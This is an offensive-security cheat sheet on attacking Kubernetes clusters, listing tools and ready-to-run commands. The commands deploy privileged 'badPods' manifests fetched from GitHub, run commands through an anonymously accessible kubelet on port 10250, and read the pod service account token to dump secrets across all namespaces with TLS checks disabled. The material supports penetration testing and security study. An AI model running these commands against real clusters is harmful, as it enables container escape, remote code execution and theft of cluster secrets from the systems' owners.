# Container - Kubernetes

> Kubernetes, often abbreviated as K8s, is an open-source container orchestration platform designed to automate the deployment, scaling, and management of containerized applications

## Summary

- [Tools](#tools)
- [Exploits](#exploits)
    - [Accessible kubelet on 10250/TCP](#accessible-kubelet-on-10250tcp)
    - [Obtaining Service Account Token](#obtaining-service-account-token)
- [References](#references)

## Tools

* [BishopFox/badpods](https://github.com/BishopFox/badpods) - A collection of manifests that will create pods with elevated privileges.
    ```ps1
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
    kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
    ```
* [serain/kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce) - Executes commands in a container on a kubelet endpoint that allows anonymous authentication
* [DataDog/KubeHound](https://github.com/DataDog/KubeHound) - Kubernetes Attack Graph
    ```ps1
    # Critical paths enumeration
    kh.containers().criticalPaths().count()
    kh.containers().dedup().by("name").criticalPaths().count()
    kh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()
    kh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()
    kh.endpoints(EndpointExposure.External).criticalPaths().count()
    kh.services().criticalPaths().count()

    # DNS services and port
    kh.endpoints(EndpointExposure.External).criticalPaths().limit(local,1)
    .dedup().valueMap("serviceDns","port")
    .group().by("serviceDns").by("port")
    ```

## Exploits

### Accessible kubelet on 10250/TCP

Requirements:
* `--anonymous-auth`: Enables anonymous requests to the Kubelet server

* Getting pods: `curl -ks https://worker:10250/pods`
* Run commands: `curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} -d 'input=1' -d 'output=1' -d'tty=1' -d 'command=ls' -d 'command=/'`


### Obtaining Service Account Token

Token is stored at `/var/run/secrets/kubernetes.io/serviceaccount/token`

Use the service account token:
* on `kube-apiserver` API: `curl -ks -H "Authorization: Bearer <TOKEN>" https://master:6443/api/v1/namespaces/{namespace}/secrets`
* with kubectl: ` kubectl --insecure-skip-tls-verify=true --server="https://master:6443" --token="<TOKEN>" get secrets --all-namespaces -o json`


## References

* [Attacking Kubernetes through Kubelet - Withsecure Labs- 11 January, 2019](https://labs.withsecure.com/publications/attacking-kubernetes-through-kubelet)
* [kubehound - Attack Reference](https://kubehound.io/reference/attacks/)
* [KubeHound: Identifying attack paths in Kubernetes clusters - Datadog - October 2, 2023](https://securitylabs.datadoghq.com/articles/kubehound-identify-kubernetes-attack-paths/)